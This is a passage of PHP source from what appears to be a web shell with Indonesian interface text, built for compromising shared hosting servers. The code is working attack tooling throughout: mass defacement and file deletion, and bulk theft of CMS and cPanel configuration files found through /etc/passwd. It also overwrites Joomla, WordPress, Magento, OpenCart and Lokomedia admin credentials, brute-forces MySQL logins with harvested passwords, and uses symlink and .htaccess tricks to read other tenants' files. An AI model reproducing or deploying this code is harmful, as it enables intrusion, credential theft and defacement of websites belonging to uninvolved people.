    }

  }
  elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
  elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
  elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
  elseif($_POST['mass'] == 'massdeface') {
    echo "<div style='margin: 5px auto; padding: 5px'>";
    sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
    echo "</div>";  }
  else {
    echo "
    <center><font style='text-decoration: underline;'>
    Select Type:<br>
    </font>
    <select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
    <option value=\"onedir\">Mass Deface 1 Dir</option>
    <option value=\"massdeface\">Mass Deface ALL Dir</option>
    <option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
    <option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
    <option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
    <font style='text-decoration: underline;'>Folder:</font><br>
    <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
    <font style='text-decoration: underline;'>Filename:</font><br>
    <input type='text' name='d_file' value='indexx.php' style='width: 450px;' height='10'><br>
    <font style='text-decoration: underline;'>Index File:</font><br>
    <textarea name='script' style='width: 700px; height: 350x;'>
    </textarea><br>
    <input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
    </form></center>";
    }
    } elseif($_GET['saf'] == 'config') {
  $etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
  $idx = mkdir("idx_config", 0777);
  $isi_htc = "Options all\nRequire None\nSatisfy Any";
  $htc = fopen("idx_config/.htaccess","w");
  fwrite($htc, $isi_htc);
  while($passwd = fgets($etc)) {
    if($passwd == "" || !$etc) {
      echo "<font color=red>Can't read /etc/passwd</font>";
    } else {
      preg_match_all('/(.*?):x:/', $passwd, $user_config);
      foreach($user_config[1] as $user_idx) {
        $user_config_dir = "/home/$user_idx/public_html/";
        if(is_readable($user_config_dir)) {
          $grab_config = array(
            "/home/$user_idx/.my.cnf" => "cpanel",
            "/home/$user_idx/.accesshash" => "WHM-accesshash",
            "/home/$user_idx/public_html/po-content/config.php" => "Popoji",
            "/home/$user_idx/public_html/vdo_config.php" => "Voodoo",
            "/home/$user_idx/public_html/bw-configs/config.ini" => "BosWeb",
            "/home/$user_idx/public_html/config/koneksi.php" => "Lokomedia",
            "/home/$user_idx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
            "/home/$user_idx/public_html/clientarea/configuration.php" => "WHMCS",
            "/home/$user_idx/public_html/whm/configuration.php" => "WHMCS",
            "/home/$user_idx/public_html/whmcs/configuration.php" => "WHMCS",
            "/home/$user_idx/public_html/forum/config.php" => "phpBB",
            "/home/$user_idx/public_html/sites/default/settings.php" => "Drupal",
            "/home/$user_idx/public_html/config/settings.inc.php" => "PrestaShop",
            "/home/$user_idx/public_html/app/etc/local.xml" => "Magento",
            "/home/$user_idx/public_html/joomla/configuration.php" => "Joomla",
            "/home/$user_idx/public_html/configuration.php" => "Joomla",
            "/home/$user_idx/public_html/wp/wp-config.php" => "WordPress",
            "/home/$user_idx/public_html/wordpress/wp-config.php" => "WordPress",
            "/home/$user_idx/public_html/wp-config.php" => "WordPress",
            "/home/$user_idx/public_html/admin/config.php" => "OpenCart",
            "/home/$user_idx/public_html/slconfig.php" => "Sitelok",
            "/home/$user_idx/public_html/application/config/database.php" => "Ellislab");
          foreach($grab_config as $config => $nama_config) {
            $ambil_config = file_get_contents($config);
            if($ambil_config == '') {
            } else {
              $file_config = fopen("idx_config/$user_idx-$nama_config.txt","w");
              fputs($file_config,$ambil_config);
            }
          }
        }   
      }
    } 
  }
  echo "<center><a href='?dir=$dir/idx_config'><font color=lime>Done</font></a></center>";
  } elseif($_GET['saf'] == 'userx') {
  if($_POST['hajar']) {
    if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
      echo "username atau password harus lebih dari 6 karakter";
    } else {
      $user_baru = $_POST['user_baru'];
      $pass_baru = md5($_POST['pass_baru']);
      $conf = $_POST['config_dir'];
      $scan_conf = scandir($conf);
      foreach($scan_conf as $file_conf) {
        if(!is_file("$conf/$file_conf")) continue;
        $config = file_get_contents("$conf/$file_conf");
        if(preg_match("/JConfig|joomla/",$config)) {
          $dbhost = ambilkata($config,"host = '","'");
          $dbuser = ambilkata($config,"user = '","'");
          $dbpass = ambilkata($config,"password = '","'");
          $dbname = ambilkata($config,"db = '","'");
          $dbprefix = ambilkata($config,"dbprefix = '","'");
          $prefix = $dbprefix."users";
          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
          $db = mysql_select_db($dbname);
          $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
          $result = mysql_fetch_array($q);
          $id = $result['id'];
          $site = ambilkata($config,"sitename = '","'");
          $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
          echo "Config => ".$file_conf."<br>";
          echo "CMS => Joomla<br>";
          if($site == '') {
            echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
          } else {
            echo "Sitename => $site<br>";
          }
          if(!$update OR !$conn OR !$db) {
            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
          } else {
            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
          }
          mysql_close($conn);
        } elseif(preg_match("/WordPress/",$config)) {
          $dbhost = ambilkata($config,"DB_HOST', '","'");
          $dbuser = ambilkata($config,"DB_USER', '","'");
          $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
          $dbname = ambilkata($config,"DB_NAME', '","'");
          $dbprefix = ambilkata($config,"table_prefix  = '","'");
          $prefix = $dbprefix."users";
          $option = $dbprefix."options";
          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
          $db = mysql_select_db($dbname);
          $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
          $result = mysql_fetch_array($q);
          $id = $result[ID];
          $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
          $result2 = mysql_fetch_array($q2);
          $target = $result2[option_value];
          if($target == '') {
            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
          } else {
            $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
          }
          $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
          echo "Config => ".$file_conf."<br>";
          echo "CMS => Wordpress<br>";
          echo $url_target;
          if(!$update OR !$conn OR !$db) {
            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
          } else {
            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
          }
          mysql_close($conn);
        } elseif(preg_match("/Magento|Mage_Core/",$config)) {
          $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
          $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
          $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
          $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
          $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
          $prefix = $dbprefix."admin_user";
          $option = $dbprefix."core_config_data";
          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
          $db = mysql_select_db($dbname);
          $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
          $result = mysql_fetch_array($q);
          $id = $result[user_id];
          $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
          $result2 = mysql_fetch_array($q2);
          $target = $result2[value];
          if($target == '') {
            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
          } else {
            $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
          }
          $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
          echo "Config => ".$file_conf."<br>";
          echo "CMS => Magento<br>";
          echo $url_target;
          if(!$update OR !$conn OR !$db) {
            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
          } else {
            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
          }
          mysql_close($conn);
        } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
          $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
          $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
          $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
          $dbname = ambilkata($config,"'DB_DATABASE', '","'");
          $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
          $prefix = $dbprefix."user";
          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
          $db = mysql_select_db($dbname);
          $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
          $result = mysql_fetch_array($q);
          $id = $result[user_id];
          $target = ambilkata($config,"HTTP_SERVER', '","'");
          if($target == '') {
            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
          } else {
            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
          }
          $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
          echo "Config => ".$file_conf."<br>";
          echo "CMS => OpenCart<br>";
          echo $url_target;
          if(!$update OR !$conn OR !$db) {
            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
          } else {
            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
          }
          mysql_close($conn);
        } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
          $dbhost = ambilkata($config,'server = "','"');
          $dbuser = ambilkata($config,'username = "','"');
          $dbpass = ambilkata($config,'password = "','"');
          $dbname = ambilkata($config,'database = "','"');
          $prefix = "users";
          $option = "identitas";
          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
          $db = mysql_select_db($dbname);
          $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
          $result = mysql_fetch_array($q);
          $target = $result[alamat_website];
          if($target == '') {
            $target2 = $result[url];
            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
            if($target2 == '') {
              $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
            } else {
              $cek_login3 = file_get_contents("$target2/adminweb/");
              $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
              if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
                $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
              } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
                $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
              } else {
                $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
              }
            }
          } else {
            $cek_login = file_get_contents("$target/adminweb/");
            $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
              $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
              $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
            } else {
              $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
            }
          }
          $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
          echo "Config => ".$file_conf."<br>";
          echo "CMS => Lokomedia<br>";
          if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
            echo $url_target2;
          } else {
            echo $url_target;
          }
          if(!$update OR !$conn OR !$db) {
            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
          } else {
            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
          }
          mysql_close($conn);
        }
      }
    }
  } else {
    echo "<center>
    <h1>Auto Edit User</h1>
    <form method='post'>
    DIR Config: <br>
    <input type='text' size='50' name='config_dir' value='$dir'><br><br>
    Set User & Pass: <br>
    <input type='text' name='user_baru' value='kontol77' placeholder='user_baru'><br>
    <input type='text' name='pass_baru' value='kontol777' placeholder='pass_baru'><br>
    <input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
    </form><br>
    ";
  }
    }elseif($_GET['saf'] == 'cpanelgb') {
@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}
echo "<center>";
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");

if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();

if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a href='http://".$domain.":2082' target='_blank'>".$domain."</a></td><td>".$owner['name']."</td><td>".$password."</td><td><a href='".$owner['name'].".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
}

}
}
echo '</table>'; 
$total = $dc;
echo '<br><div class="result">NEMU CPANEL = '.$total.'</h3><br />';
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td>'.$r."</td><td>".$password."</td><td><a href='".$r.".txt' target='_blank'>Ini Password</a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
        }
            }
      }
echo '</table>'; 
$total = $dc;
echo '<br><div class="result">JUMLAH LONTE = '.$total.'</h3><br />';
echo '</center>';

}
}else{
echo "<div class='result'><i><font color='#FF0000'>GGAK BISA BACA</font><br><font color='#FF0000'>/var/named</font> or <font color='#FF0000'>etc/named.conf</font> Not Accessible!</i></div>";
}
        } elseif($_GET['do'] == 'jumping') {
  $i = 0;
  echo "<div class='margin: 5px auto;'>";
  if(preg_match("/hsphere/", $dir)) {
    $urls = explode("\r\n", $_POST['url']);
    if(isset($_POST['jump'])) {
      echo "<pre>";
      foreach($urls as $url) {
        $url = str_replace(array("http://","www."), "", strtolower($url));
        $etc = "/etc/passwd";
        $f = fopen($etc,"r");
        while($gets = fgets($f)) {
          $pecah = explode(":", $gets);
          $user = $pecah[0];
          $dir_user = "/hsphere/local/home/$user";
          if(is_dir($dir_user) === true) {
            $url_user = $dir_user."/".$url;
            if(is_readable($url_user)) {
              $i++;
              $jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
              if(is_writable($url_user)) {
                $jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
              }
              echo $jrw."<br>";
            }
          }
        }
      }
    if($i == 0) { 
    } else {
      echo "<br>Total ada ".$i." Kamar di ".$ip;
    }
    echo "</pre>";
    } else {
      echo '<center>
          <form method="post">
          List Domains: <br>
          <textarea name="url" style="width: 500px; height: 250px;">';
      $fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
      while($getss = fgets($fp)) {
        echo $getss;
      }
      echo  '</textarea><br>
          <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
          </form></center>';
    }
  } elseif(preg_match("/vhosts/", $dir)) {
    $urls = explode("\r\n", $_POST['url']);
    if(isset($_POST['jump'])) {
      echo "<pre>";
      foreach($urls as $url) {
        $web_vh = "/var/www/vhosts/$url/httpdocs";
        if(is_dir($web_vh) === true) {
          if(is_readable($web_vh)) {
            $i++;
            $jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
            if(is_writable($web_vh)) {
              $jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
            }
            echo $jrw."<br>";
          }
        }
      }
    if($i == 0) { 
    } else {
      echo "<br>Total ada ".$i." Kamar di ".$ip;
    }
    echo "</pre>";
    } else {
      echo '<center>
          <form method="post">
          List Domains: <br>
          <textarea name="url" style="width: 500px; height: 250px;">';
          bing("ip:$ip");
      echo  '</textarea><br>
          <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
          </form></center>';
    }
  } else {
    echo "<pre>";
    $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
    while($passwd = fgets($etc)) {
      if($passwd == '' || !$etc) {
        echo "<font color=red>Can't read /etc/passwd</font>";
      } else {
        preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
        foreach($user_jumping[1] as $user_idx_jump) {
          $user_jumping_dir = "/home/$user_idx_jump/public_html";
          if(is_readable($user_jumping_dir)) {
            $i++;
            $jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
            if(is_writable($user_jumping_dir)) {
              $jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
            }
            echo $jrw;
            if(function_exists('posix_getpwuid')) {
              $domain_jump = file_get_contents("/etc/named.conf");  
              if($domain_jump == '') {
                echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
              } else {
                preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                foreach($domains_jump[1] as $dj) {
                  $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                  $user_jumping_url = $user_jumping_url['name'];
                  if($user_jumping_url == $user_idx_jump) {
                    echo " => ( <u>$dj</u> )<br>";
                    break;
                  }
                }
              }
            } else {
              echo "<br>";
            }
          }
        }
      }
    }
    if($i == 0) { 
    } else {
      echo "<br>Total ada ".$i." Kamar di ".$ip;
    }
    echo "</pre>";
  }
  echo "</div>";
  } elseif($_GET['saf'] == 'cpanel') {
    if($_POST['crack']) {
        $usercp = explode("\r\n", $_POST['user_cp']);
        $passcp = explode("\r\n", $_POST['pass_cp']);
        $i = 0;
        foreach($usercp as $ucp) {
            foreach($passcp as $pcp) {
                if(@mysql_connect('localhost', $ucp, $pcp)) {
                    if($_SESSION[$ucp] && $_SESSION[$pcp]) {
                    } else {
                        $_SESSION[$ucp] = "1";
                        $_SESSION[$pcp] = "1";
                        if($ucp == '' || $pcp == '') {
                           
                        } else {
                            $i++;
                            if(function_exists('posix_getpwuid')) {
                                $domain_cp = file_get_contents("/etc/named.conf"); 
                                if($domain_cp == '') {
                                    $dom =  "<font color=red>gabisa ambil nama domain nya</font>";
                                } else {
                                    preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
                                    foreach($domains_cp[1] as $dj) {
                                        $user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                        $user_cp_url = $user_cp_url['name'];
                                        if($user_cp_url == $ucp) {
                                            $dom = "<a href='http://$dj/' target='_blank'><font color=blue>$dj</font></a>";
                                            break;
                                        }
                                    }
                                }
                            } else {
                                $dom = "<font color=red>function is Disable by system</font>";
                            }
                            echo "username (<font color=blue>$ucp</font>) password (<font color=blue>$pcp</font>) domain ($dom)<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) {
        } else {
            echo "<br>sukses nyolong ".$i." Cpanel by <font color=blue>By Restu ID.</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
        USER: <br>
        <textarea style='width: 450px; height: 150px;' name='user_cp'>";
        $_usercp = fopen("/etc/passwd","r");
        while($getu = fgets($_usercp)) {
            if($getu == '' || !$_usercp) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all("/(.*?):x:/", $getu, $u);
                foreach($u[1] as $user_cp) {
                        if(is_dir("/home/$user_cp/public_html")) {
                            echo "$user_cp\n";
                    }
                }
            }
        }
        echo "</textarea><br>
        PASS: <br>
        <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
        function cp_pass($dir) {
            $pass = "";
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                if(!is_file("$dir/$dirb")) continue;
                $ambil = file_get_contents("$dir/$dirb");
                if(preg_match("/WordPress/", $ambil)) {
                    $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/JConfig|joomla/", $ambil)) {
                    $pass .= ambilkata($ambil,"password = '","'")."\n";
                } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
                    $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
                    $pass .= ambilkata($ambil,'password = "','"')."\n";
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
                    $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/^[client]$/", $ambil)) {
                    preg_match("/password=(.*?)/", $ambil, $pass1);
                    if(preg_match('/"/', $pass1[1])) {
                        $pass1[1] = str_replace('"', "", $pass1[1]);
                        $pass .= $pass1[1]."\n";
                    } else {
                        $pass .= $pass1[1]."\n";
                    }
                } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
                    $pass .= ambilkata($ambil,"db_password = '","'")."\n";
                }
            }
            echo $pass;
        }
        $cp_pass = cp_pass($dir);
        echo $cp_pass;
        echo "</textarea><br>
        <input type='submit' name='crack' style='width: 450px;' value='Crack'>
        </form>";
    }
  } elseif($_GET['kill'] == 'self') {
  if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
      die('<center><br><center><h2>SHELL TELAH DI HAPUS</h2><br>MANTAP BUJANK JIWAMU NAK</center></center>');
    else
      echo '<center>unlink failed!</center>';
  }elseif($_GET['sym'] == 'brudul') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("brudul_sym",0777);
@chdir("brudul_sym");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "<br>
<table align=center border=1 style='width:80%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/brudul_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("brudul_sym",0777);
@chdir("brudul_sym");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/brudul_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("brudul_sym",0777);@chdir("brudul_sym");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 =
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file =
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/brudul_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }
  } elseif($_GET['config'] == 'grabber') {
      if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
exit;
}
  if($_POST){ if($_POST['config'] == 'symvhosts') {
    @mkdir("brudul_symvhosts", 0777);
exe("ln -s / brudul_symvhosts/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("brudul_symvhosts/.htaccess",$htaccess);
    $etc_passwd=$_POST['passwd'];
    
    $etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[5];
$jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
if (preg_match('/vhosts/i',$user)){
exe("ln -s ".$user."/httpdocs/wp-config.php brudul_symvhosts/".$jembod."-Wordpress.txt");
exe("ln -s ".$user."/httpdocs/configuration.php brudul_symvhosts/".$jembod."-Joomla.txt");
exe("ln -s ".$user."/httpdocs/config/koneksi.php brudul_symvhosts/".$jembod."-Lokomedia.txt");
exe("ln -s ".$user."/httpdocs/forum/config.php brudul_symvhosts/".$jembod."-phpBB.txt");
exe("ln -s ".$user."/httpdocs/sites/default/settings.php brudul_symvhosts/".$jembod."-Drupal.txt");
exe("ln -s ".$user."/httpdocs/config/settings.inc.php brudul_symvhosts/".$jembod."-PrestaShop.txt");
exe("ln -s ".$user."/httpdocs/app/etc/local.xml brudul_symvhosts/".$jembod."-Magento.txt");
exe("ln -s ".$user."/httpdocs/admin/config.php brudul_symvhosts/".$jembod."-OpenCart.txt");
